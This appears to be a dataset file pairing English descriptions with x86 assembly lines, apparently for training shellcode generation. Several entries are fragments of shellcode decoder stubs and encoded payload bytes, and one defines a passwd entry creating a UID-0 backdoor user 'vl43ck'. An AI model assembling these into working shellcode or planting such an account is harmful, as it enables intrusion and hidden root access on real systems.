+decrement var0 register and jump decode label if contents var0 register not zero else jump var2 label </s> loop decode \n jmp var2
+decrement var0 register and jump decode label if contents var0 register not zero else jump short shellcode label </s> loop decode \n jmp short shellcode
+decrement var0 and jumps decrypt label var2 var3 var0 caused its value become zero </s> loop decrypt
+decrement var0 register and jump var2 label if contents var0 register not zero else jump var3 register </s> loop var2 \n jmp var3
+declare var0 label </s> var0 :
+declare main label </s> main :
+move contents al register var0 register </s> mov [var0] , al
+move contents al register var0 register </s> mov [var0] , al
+move al into the address [esi+13] </s> mov [esi+13] , al
+move the byte at the address [esi] into al </s> mov al , byte [esi]
+move byte var0 al register </s> mov al , byte [var0]
+move the byte at the memory location specified by the operation [esi+1+ebp] into al </s> mov al , byte [esi+1+ebp]
+move byte address var0 al </s> mov al , byte [var0]
+move cl al </s> mov al , cl
+move dl al </s> mov al , dl
+move var0 al </s> mov al , var0
+move contents address pointed var0 ax register </s> mov ax , [var0]
+move memory offset var0 ax </s> mov ax , table[esi*4]
+move var0 bh </s> mov bh , var0
+move var0 bh </s> mov bh , var0
+move contents memory address var0 var1 </s> mov var1 , [var0]
+move var0 var1 </s> mov var1 , var0
+move var0 var1 </s> mov var1 , var0
+move 1 var0 </s> mov var0 , 1
+move the byte at the address [eax] into bl </s> mov bl , byte [eax]
+move byte var0 var1 </s> mov var1 , byte [var0]
+move the byte at the address [edi] into bl </s> mov bl , byte [edi]
+move the byte starting at the address [esi + eax + 1] into the bl register </s> mov bl , byte [esi+eax+1]
+move byte var0 var1 </s> mov var1 , byte [var0]
+move the byte at the address [esi] into bl </s> mov bl , byte [esi]
+move the byte at the address [esi+ecx+1] into bl </s> mov bl , byte [esi+ecx+1]
+move byte var0 var1 </s> mov var1 , byte [var0]
+move byte var0 var1 </s> mov var1 , byte var0
+move dl var0 </s> mov var0 , dl
+move dl byte var0 </s> mov byte [var0] , dl
+move al into the byte at address [ebx + 35] </s> mov byte [ebx+35] , al
+move the contents var0 register byte starting address var1 </s> mov byte [var1] , var0
+move bl into the byte at address [edx + eax] </s> mov byte [edx+eax] , bl
+move var0 byte edx+eax </s> mov byte [var1] , var0
+move the contents of dl into the byte at the memory location specified by the operation [esi+1] </s> mov byte [esi+1] , dl
+move al byte var0 </s> mov byte [var0] , al
+move al into the byte at address [esi+10] </s> mov byte [esi+10] , al
+move bl into the byte at address [esi+ecx] </s> mov byte [esi+ecx] , bl
+move var0 single byte address stored esi+ecx </s> mov byte [var1] , var0
+move 0x0a into the byte at address [esp] </s> mov byte [esp] , 0x0a
+move 0x2e into the byte at address [esp] </s> mov byte [esp] , 0x2e
+move var0 var1 </s> mov var1 , var0
+move 0102 cl </s> mov cl , 0102
+move var0 cl </s> mov cl , var0
+move al cl </s> mov cl , al
+move byte var0 cl </s> mov cl , byte [var0]
+move the byte at the address [esi] into cl </s> mov cl , byte [esi]
+move 3rd element array var0 cl </s> mov cl , var0[2]
+move var0 cl </s> mov cl , var0
+move var0 var1 </s> mov var1 , var0
+move var0 var1 </s> mov var1 , var0
+move var0 dl </s> mov dl , var0
+move var0 dl </s> mov dl , var0
+move var0 dl </s> mov dl , var0
+move the byte at the memory location specified by the operation [eax+1] into dl </s> mov dl , byte [eax+1]
+move the singl byte at the memory location specified by the operation [esi+1] into dl </s> mov dl , byte [esi+1]
+move single byte var0 dl </s> mov dl , byte [var0]
+move byte var0 dl </s> mov dl , byte var0
+backup var0 var1 </s> mov var1 , var0
+move var0 var1 </s> mov var1 , var0
+move esp var0 </s> mov var0 , esp
+move contents memory address var0 ebx </s> mov ebx , [var0]
+move var0 var1 </s> mov var1 , var0
+move var0 var1 </s> mov var1 , var0
+move esp var0 </s> mov var0 , esp
+move contents esp register var0 register </s> mov var0 , esp
+move var0 var1 </s> mov var1 , var0
+move var0 var1 </s> mov var1 , var0
+move var0 var1 </s> mov var1 , var0
+move var0 var1 </s> mov var1 , var0
+move decimal 78 var0 </s> mov var0 , 78
+move address stack pointer var0 </s> mov var0 , esp
+move var0 var1 </s> mov var1 , var0
+move var0 integer representation 2 2 bytes starting address var1 </s> mov word [var1] , 2
+multiply var0 var1 </s> mul var1
+define var0 label </s> var0 :
+do nothing </s> nop
+perform var0 inversion byte starting address var1 </s> not byte [var1]
+negate all bits word address ax </s> not word ax
+declare var0 function </s> odd_number :
+pop last element pushed stack cx </s> pop cx
+pop value stack back var0 </s> pop var0
+restore var0 stack </s> pop var0
+restore top stack var0 register </s> pop var0
+restore top stack var0 register </s> pop var0
+pop top stack var0 register </s> pop var0
+pop value stack back var0 </s> pop var0
+get address shellcode </s> pop esi
+load address encoded shellcode var0 </s> pop var0
+pop shellcode var0 </s> pop var0
+shellcode address var0 </s> pop var0
+shellcode var0 </s> pop var0
+store shellcode var0 register and copy it ax </s> pop var0 \n mov ax , [var0]
+save encoded shellcode var0 and move it var1 </s> pop var0 \n mov var1 , [var0]
+point var0 shellcode and save it cx </s> pop var0 \n mov cx , [var0]
+pop var0 stack 32 bit registers </s> popad
+push var0 stack </s> push var0
+push contents var0 register stack and point var1 stack register </s> push var0 \n mov var1 , esp
+declare retry label </s> retry :
+left rotate byte var0 1 time </s> rol byte [var0] , 0x1
+left rotate var0 register 4 times </s> rol var0 , 0x4
+right rotate byte var0 1 time </s> ror byte [var0] , 0x1
+right rotate var0 1 time </s> ror var0 , 1
+declare shell label </s> shell :
+define shellcode label </s> shellcode :
+define array bytes shellcode and initialize it var0 var3 SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/var7 </s> shellcode : db "vl43ck : $6$bxwJfzor$var2 . var3 . var4 : 0 : 0 : vl43ck : /tmp : /var7"
+define shellcode array bytes and initialize it var0 </s> shellcode : db 0x4b , 0xf7 , 0x13 , 0x59 , 0xcc , 0x8c , 0x63 , 0x5e , 0x9f , 0x8d , 0x99 , 0x9f , 0x1f , 0xa4 , 0x3b , 0x6e , 0xc6 , 0x36 , 0x23
+define var0 equal length shellcode </s> var0 equ $-shellcode
+define var0 label </s> var0 :
+multiply value var0 2 </s> shl var0 , 1
+left shift contents var0 register 28 bit positions </s> shl var0 , 28
+left shift contents var0 8 bits </s> shl var0 , 8
+multiply var0 4 using left shift </s> shl var0 , 2
+right shift ax 1 bit </s> shr ax , 1
+right shift contents var0 register contents cl register </s> shr ax , cl
+right shift contents var0 register 4 bit positions </s> shr var0 , 4
+right shift contents dl register 1 bit positions </s> shr dl , 1
+right shift contents dl register 4 bit positions </s> shr dl , 4
+shift right var0 contents var2 and negate byte var0 </s> shr var0 , var2 \n not byte var0
+right shift contents var0 register 24 bit positions </s> shr var0 , 24
+right shift contents var0 register 28 bit positions </s> shr var0 , 28
+right shift contents var0 register contents cl register </s> shr var0 , cl
+define stage label </s> stage :
+declare var0 label </s> var0 :
+subtract 13 ax and save result ax </s> sub ax , 13
+subtract 1564 contents ax register </s> sub ax , 1564
+subtract contents al register contents var0 register and save result var0 </s> sub var0 , al
+subtract var0 byte var1 register </s> sub bl , byte [var1]
+subtract value 3 byte var0 and negate it </s> sub byte [var0] , 3 \n not byte [var0]
+subtract value 1 contents cl register and jump decode label if result not zero </s> sub cl , 1 \n jnz decode
+subtract contents dl register contents cl register and save result cl </s> sub cl , dl
+subtract contents cx contents cx </s> sub cx , cx
+subtract contents al register contents dl register and jump var0 label if result not negative </s> sub dl , al \n jns var0
+subtract contents var0 contents var1 </s> sub var1 , var0
+subtract var0 var1 </s> sub var1 , var0
+allocate memory var0 variable </s> sub esp , 4
+subtract byte value var0 esp register and save result esp </s> sub esp , byte var0
+if contents var0 register zero then jump label socket </s> test var0 , var0 \n jz socket
+jump short label var0 if contents var1 register negative </s> test var1 , var1 \n js short var0
+test contents var0 register </s> test var0 , var0
+swap contents var0 and var1 </s> xchg [var0] , var1
+perform xor operation al register and value var0 </s> xor al , var0
+perform xor operation ax and var0 and save result ax </s> xor ax , var0
+perform logical xor var0 register and ax register and save result ax </s> xor ax , var0
+jump var0 label if result logical xor ax register and var1 register zero </s> xor ax , var1 \n jz var0
+jump encoded label if result logical xor var0 register and value var1 zero </s> xor var0 , var1 \n jz encoded
+jump formatting label if result logical xor var0 register and value var1 zero </s> xor var0 , var1 \n jz formatting
+initialize var0 0 </s> xor var0 , var0
+clear var0 register </s> xor var0 , var0
+perform xor operation byte starting addess var0 and value var1 </s> xor byte [var0] , var1
+perform xor operation byte var0 and cl </s> xor byte [var0] , cl
+perform xor operation byte memory location var0 and var1 </s> xor byte [var0] , var1
+perform xor operation cl and var0 and store var1 cl </s> xor cl , var0
+jump var0 label if result logical xor cl register and value var1 not zero </s> xor cl , var1 \n jnz var0
+jump var0 label if result logical xor cl register and value var1 zero </s> xor cl , 0XAA \n jz var0
+jump var0 label if result logical xor dl register and value var1 zero </s> xor dl , var1 \n jz var0
+clear var0 register </s> xor var0 , var0
+clear var0 register and move next byte shellcode lower byte register </s> xor var0 , var0 \n mov al , [esi+1]
+clear var0 register and move 2 lowest byte register </s> xor var0 , var0 \n mov al , 2
+clear var0 register and push its contents stack </s> xor var0 , var0 \n push var0
+clear var0 and var1 </s> xor var0 , var0 \n xor var1 , var1
+zero out var0 var1 and var2 </s> xor var0 , var0 \n xor var1 , var1 \n xor var2 , var2
+clear var0 register </s> xor var0 , var0
+clear var0 </s> xor var0 , var0
+clear var0 register </s> xor var0 , var0
+zero out var0 register and jump exit label if contents var2 register not equal contents var0 register </s> xor var0 , var0 \n cmp var2 , var0 \n jne exit
+clear var0 and move var1 lowest byte register </s> xor var0 , var0 \n mov bl , var1
+zero out var0 register and push zero stack </s> xor var0 , var0 \n push var0
+clean var0 and var1 </s> xor var0 , var0 \n xor var1 , var1
+perform logical xor var0 register and bh register and save result var0 </s> xor var0 , bh
+clear var0 </s> xor var0 , var0
+zero out var0 register and jump var2 label if contents var3 register not equal contents var0 register </s> xor var0 , var0 \n cmp var3 , var0 \n jne var2
+zero out var0 register and move next byte shellcode lower byte register </s> xor var0 , var0 \n mov cl , [esi+1]
+zero out var0 and move var1 lowest byte register </s> xor var0 , var0 \n mov cl , var1
+clear var0 register and move 2 lowest byte register </s> xor var0 , var0 \n mov cl , 2
+clean var0 register and move 5 lowest byte register </s> xor var0 , var0 \n mov cl , 5
+zero out var0 register and var1 register </s> xor var1 , var1 \n mul var1
+var0 var1 0 </s> xor var1 , var1
+zero out var0 register and move next byte shellcode lower byte register </s> xor var0 , ecx \n mov dl , [esi+1]
+zero out var0 register and jump var2 label if contents var3 register not equal contents var0 register </s> xor var0 , var0 \n cmp var3 , var0 \n jne var2
+clean var0 register and move 5 lowest byte register </s> xor var0 , var0 \n mov dl , 5
+zero out var0 </s> xor var0 , var0
